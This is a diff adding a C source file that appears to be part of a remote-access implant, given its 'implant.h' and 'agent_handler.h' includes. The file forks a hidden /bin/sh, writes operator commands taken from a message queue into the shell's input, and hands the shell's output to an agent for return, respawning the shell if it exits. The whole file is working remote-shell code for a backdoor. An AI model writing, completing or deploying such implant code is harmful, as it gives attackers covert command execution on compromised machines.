@@ -1,0 +1,149 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <string.h>
+
+#include "queue.h"
+#include "implant.h"
+#include "agent_handler.h"
+
+#define STDIN		0
+#define STDOUT		1
+#define STDERR		2
+#define PIPE_OUT	0
+#define PIPE_IN		1
+
+// Globals
+extern Queue* shell_receive_queue;
+extern pthread_mutex_t shell_receive_queue_lock;
+extern Queue* shell_send_queue;
+extern pthread_mutex_t shell_send_queue_lock;
+
+typedef struct Pipes{
+	int pipefd[2];
+} Pipes;
+
+typedef struct Shell_Pipes{
+	Pipes pipes[3];
+} Shell_Pipes;
+
+void *shell_thread(void *vargp){
+	pid_t pid;
+	Shell_Pipes shell_pipes = {0};
+	Queue_Message* message;
+	int nbytes = 0;
+	char buf[BUFFERSIZE];
+	char* buffer;
+	
+	for (int i = 0; i < 3; i++){
+		if (pipe(shell_pipes.pipes[i].pipefd) == -1){
+			printf("ERROR pipe failed\n");
+			exit(-1);
+		}
+	}
+	
+	// we don't want to block on read for STDOUT PIPE_OUT and STDERR PIPE_OUT
+	if (fcntl(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT], F_SETFL, O_NONBLOCK) < 0){
+		printf("ERROR nonblocking pipe option failed\n");
+		exit(-1);
+	}
+	if (fcntl(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT], F_SETFL, O_NONBLOCK) < 0){
+		printf("ERROR nonblocking pipe option failed\n");
+		exit(-1);
+	}
+		
+	pid = fork();
+	
+	if (pid < 0){
+		printf("ERROR fork failed\n");
+	}
+	else if (pid == 0){		// child
+		close(shell_pipes.pipes[STDIN].pipefd[PIPE_IN]);					// close input of STDIN (not writing to STDIN)
+		dup2(shell_pipes.pipes[STDIN].pipefd[PIPE_OUT], STDIN_FILENO);		// dup output of STDIN to shell STDIN
+		
+		close(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT]);					// close output of STDOUT (not reading from STDOUT)
+		dup2(shell_pipes.pipes[STDOUT].pipefd[PIPE_IN], STDOUT_FILENO);		// dup input of STDOUT to shell STDOUT
+		
+		close(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT]);					// close output of STDERR (not reading from STDERR)
+		dup2(shell_pipes.pipes[STDERR].pipefd[PIPE_IN], STDERR_FILENO);		// dup input of STDERR to shell STDERR
+		
+		// Execute shell
+		char * const argv[] = {"/bin/sh", NULL};
+		execve("/bin/sh", argv, NULL);
+		
+		// If shell closes, end this process so parent can respawn
+		exit(0);
+		
+	}
+	else {					// parent
+		close(shell_pipes.pipes[STDIN].pipefd[PIPE_OUT]);					// close output of STDIN (not reading from STDIN)
+		close(shell_pipes.pipes[STDOUT].pipefd[PIPE_IN]);					// close input of STDOUT (not writing to STDOUT)
+		close(shell_pipes.pipes[STDERR].pipefd[PIPE_IN]);					// close input of STDERR (not writing to STDERR)
+		
+		// check if child is still running
+		// if still running, dequeue messages and send to shell
+		// if child was killed, we need to start another child process
+		while (!waitpid(-1, NULL, WNOHANG)){
+			if (message = dequeue(shell_send_queue, &shell_send_queue_lock)){
+				debug_print("dequeued message for shell: %s, %d\n", message->buffer, message->size);
+				if ((nbytes = write(shell_pipes.pipes[STDIN].pipefd[PIPE_IN], message->buffer, message->size)) == -1){
+					printf("ERROR write to shell\n");
+					exit(-1);
+				}
+				
+				free(message->buffer);
+				free(message);
+			}
+			
+			// Read from STDOUT
+			nbytes = read(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT], buf, BUFFERSIZE - 4);
+			if (nbytes == -1){
+				if (errno != EAGAIN){				// EAGAIN means pipe is empty and no error
+					printf("ERROR STDOUT read from shell: %d\n", errno);
+					exit(-1);
+				}
+			}
+			else if (nbytes == 0){					// shell is closed?
+				close(shell_pipes.pipes[STDIN].pipefd[PIPE_IN]);					// close input of STDIN
+				close(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT]);					// close output of STDOUT
+				close(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT]);					// close output of STDERR
+				break;
+			}
+			else{
+				buffer = malloc(nbytes);
+				memcpy(buffer, buf, nbytes);
+				
+				debug_print("command response\n_____\n%s\n_____\n", buffer);
+				
+				if (agent_prepare_message(TYPE_COMMAND, buffer, nbytes) != RET_OK){
+					printf("ERROR agent_prepare_message error\n");
+				}
+			}
+			memset(buf, 0, BUFFERSIZE);
+			
+			// Read from STDERR
+			nbytes = read(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT], buf, BUFFERSIZE);
+			if (nbytes == -1){
+				if (errno != EAGAIN){				// EAGAIN means pipe is empty and no error
+					printf("ERROR STDERR read from shell: %d\n", errno);
+					exit(-1);
+				}
+			}
+			else if (nbytes == 0){					// shell is closed?
+				close(shell_pipes.pipes[STDIN].pipefd[PIPE_IN]);					// close input of STDIN
+				close(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT]);					// close output of STDOUT
+				close(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT]);					// close output of STDERR
+				break;
+			}
+			else{
+				printf("DEBUG STDERR: %s\n", buf);
+			}
+			memset(buf, 0, BUFFERSIZE);
+		}
+	}
+	
+	return 0;
+}
